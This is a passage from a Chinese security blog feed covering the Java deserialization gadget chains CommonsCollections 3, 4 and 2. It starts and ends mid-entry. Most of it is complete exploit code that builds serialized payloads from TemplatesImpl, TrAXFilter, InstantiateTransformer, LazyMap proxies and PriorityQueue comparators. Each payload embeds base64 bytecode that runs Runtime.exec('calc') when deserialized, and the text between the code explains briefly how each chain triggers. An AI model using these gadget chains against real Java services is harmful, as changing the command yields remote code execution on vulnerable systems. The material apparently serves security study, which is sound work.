            //动态代理类，为了触发 AnnotationInvocationHandler#invoke
            Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

            InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);


            //序列化
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(handler1);
            oos.flush();
            oos.close();

            //测试反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    //反射设置 Field
    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}

```
## 分析
在demo中，Transformer数组对象的组成是ConstantTransformer+InstantiateTransformer，和CC1-2相比，变了的是将InvokerTransformer换成了InstantiateTransformer

![](https://s3.hedgedoc.org/demo/uploads/6c6ffe28-360f-4934-9d1d-e21f420961fa.png)

我们跟进InstantiateTransformer.transform()方法

![](https://s3.hedgedoc.org/demo/uploads/2c721a72-c158-4aea-9ad8-b7bed57b6a7f.png)

它的作用是获取传入对象input，然后通过反射获取构造方法，最后通过newInstance()方法实例化input对象并输出

其中需要构造方法的参数类型（iParamTypes）和实例化需要的参数对象（iArgs）

而iParamTypes和iArgs都是在InstantiateTransformer实例化的时候传入

![](https://s3.hedgedoc.org/demo/uploads/03e28a3d-9355-4af3-8d23-e19b3df4ecad.png)

demo这里是传入的一个Templates对象

![](https://s3.hedgedoc.org/demo/uploads/693556b7-b8ff-4014-8142-510bda3b1cde.png)

经过前面的CC1链分析，我们知道会调用Transformer数组对象中元素的transform()方法，并且前一个元素transform()方法的值，是后一个元素transform()方法的参数

也就是说InstantiateTransformer.transform()的传入的值是TrAXFilter.class

![](https://s3.hedgedoc.org/demo/uploads/f06d2cce-28aa-43d4-99d3-cc41f426711e.png)

所以demo中Transformer数组对象其实就是一个TrAXFilter对象

继续看Transformer数组前的代码

![](https://s3.hedgedoc.org/demo/uploads/79ce0f17-22c5-433c-874f-961765c6de3c.png)

new了一个TemplatesImpl对象，并给_bytecodes、_name、_tfactory三个成员变量赋值，我们把code的代码给解码然后反编译

![](https://s3.hedgedoc.org/demo/uploads/8ce91908-c322-43ff-af0f-c4d3b3af8c30.png)

其实就是一个自定义的类，不过继承了AbstractTranslet并在构造函数中执行了弹出计算器的命令，也就是说实例化这个自定义类的时候，就会触发命令弹出计算器的命令

但是这个自定义类通过TemplatesImpl类动态加载为对象（tmplates）并封装到了TrAXFilter对象中

![](https://s3.hedgedoc.org/demo/uploads/a97ab2e8-23c0-40f5-8bcd-a657bbbbc9b0.png)

为啥要将TemplatesImpl类封装到TrAXFilter对象中，我们跟进到TrAXFilter类

![](https://s3.hedgedoc.org/demo/uploads/c207a31d-cd7b-4571-853f-d38f1ca0c42f.png)

可以看到，在构造方法中，只要TrAXFilter类一实例化，就会调用_transformer = (TransformerImpl) templates.newTransformer()，而templates是一个Templates实例对象，而TemplatesImpl类实现了Templates接口，所以调用templates.newTransformer()就会实例化自定义类，执行命令，弹出计算器

然后后面的代码，就是正常的cc1-2链中的内容

![](https://s3.hedgedoc.org/demo/uploads/53db633d-2eef-44b3-b517-a12330ff72c6.png)

## 完整代码
```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import com.sun.org.apache.xml.internal.security.utils.Base64;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3 {

    //用于反射调用成员变量并赋值
    public static void setValue(Object object, String name, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(object,value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception{
        byte[] code = Base64.decode("yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name","test111");
        setValue(templates,"_bytecodes", new byte[][]{code});
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //反射获取AnnotationInvocationHandler实例
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        //动态代理类，设置一个D代理对象，为了触发 AnnotationInvocationHandler#invoke
        Map mapProxy = (Map) Proxy.newProxyInstance(
                LazyMap.class.getClassLoader(),
                LazyMap.class.getInterfaces(),
                handler);

        InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
        System.out.println(11);
        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\2200.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(handler1);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\2200.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
## 学习
https://xz.aliyun.com/t/9409
















]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>5、CC4</title>
    <url>/2023/08/22/5%E3%80%81CC4/</url>
    <content><![CDATA[# CC4
## 利用版本
jdk8（这里用的jdk8u201） &&  Commons-Collections 4（除了4.0都能用）
## CC4 Demo
```
package Apache_Common_Collections.cc_1_7;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

//与cc2类似
//InvokeTransformer 变为 InstantiateTransformer
public class CommonsCollections4 {

    public static void main(String[] args) {

        try{
            //字节码
            byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");

            //反射设置 Field
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{code});
            setFieldValue(templates, "_name", "HelloTemplatesImpl");
            setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

            //Transformer数组
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
            };


            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            //TransformingComparator 实例
            TransformingComparator comparator = new TransformingComparator(chainedTransformer);

            //PriorityQueue 实例
            PriorityQueue priorityQueue = new PriorityQueue(2);
            //先设置为正常变量值，后面可以通过setFieldValue修改
            priorityQueue.add(1);
            priorityQueue.add(1);

            //反射设置 Field
            Object[] objects = new Object[]{templates, templates};
            setFieldValue(priorityQueue, "queue", objects);
            setFieldValue(priorityQueue, "comparator", comparator);

            //序列化
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(priorityQueue);
            oos.flush();
            oos.close();

            //测试反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    //反射设置 Field
    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}

```
## 相比其他CC链
在CommonsCollections4系列中，除4.0版本，其他版本InvokerTransformer类都没有实现Serializable接口 ，导致无法序列化，所以这里就是在CC2的基础上使用InstantiateTransformer替换了InvokerTransformer

## 分析
代码与CC1、CC2、CC3有重合，这里就不画蛇添足了

## 完整代码
```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.utils.Base64;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections4 {

    //用于反射调用成员变量并赋值
    public static void setValue(Object object, String fieldName, Object fieldValue) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object,fieldValue);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception{
        byte[] code = Base64.decode("yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name","test111");
        setValue(templates,"_bytecodes", new byte[][]{code});
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //TransformingComparator实例，并将InvokerTransformer封装进去
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

        //获取PriorityQueue实例
        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add(1);
        priorityQueue.add(2);

        //PriorityQueue实例的成员变量赋值
        Object[] objects = new Object[]{templates,templates};
        setValue(priorityQueue,"queue",objects);
        setValue(priorityQueue,"comparator",transformingComparator);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa23.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(priorityQueue);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa23.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
效果:

![](https://s3.hedgedoc.org/demo/uploads/8072c067-f5b1-4039-8cab-ca24c5e287e2.png)

报错，但是不影响我弹计算器

## 学习
https://xz.aliyun.com/t/9409




























]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>4、CC2</title>
    <url>/2023/08/22/4%E3%80%81CC2/</url>
    <content><![CDATA[# CC2
## 前置知识
{% post_link TemplatesImpl %}
## 利用版本
jdk8（这里用的jdk8u201）&& Commons-Collections 4-4.0（只有4.0能用）
## CC Demo
```
package Apache_Common_Collections.cc_1_7;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections2 {

    public static void main(String[] args) {

        try{
            //字节码
            byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");

            //反射设置 Field
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{code});
            setFieldValue(templates, "_name", "HelloTemplatesImpl");
            setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

            //为了执行 templates.newTransformer
            InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

            //TransformingComparator 实例
            TransformingComparator comparator = new TransformingComparator(invokerTransformer);

            //PriorityQueue 实例
            PriorityQueue priorityQueue = new PriorityQueue(2);
            //先设置为正常变量值，后面可以通过setFieldValue修改
            priorityQueue.add(1);
            priorityQueue.add(1);

            //反射设置 Field
            Object[] objects = new Object[]{templates, templates};
            setFieldValue(priorityQueue, "queue", objects);
            setFieldValue(priorityQueue, "comparator", comparator);

            //序列化
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(priorityQueue);
            oos.flush();
            oos.close();

            //测试反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    //反射设置 Field
    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}

```
## 分析
demo从下往上分析，序列化的是一个PriorityQueue对象，我们跟进PriorityQueue类

![](https://s3.hedgedoc.org/demo/uploads/3612406a-6efd-45c0-b88c-0c6f3e54f833.png)

它实现了Serializable接口，并重写了readObject方法

![](https://s3.hedgedoc.org/demo/uploads/2a6193e7-c04e-4be6-8659-b682aac37a6b.png)

![](https://s3.hedgedoc.org/demo/uploads/ffda2ca1-5c6c-4b9a-847d-faec9366bff2.png)

我们跟进heapify()方法

![](https://s3.hedgedoc.org/demo/uploads/7d831cfb-5544-43d5-9cda-3601c61da3c1.png)

继续跟进siftDown()方法

![](https://s3.hedgedoc.org/demo/uploads/ec7aa726-6288-4e67-90ad-265a2bf491f6.png)

继续跟进siftDownUsingComparator方法

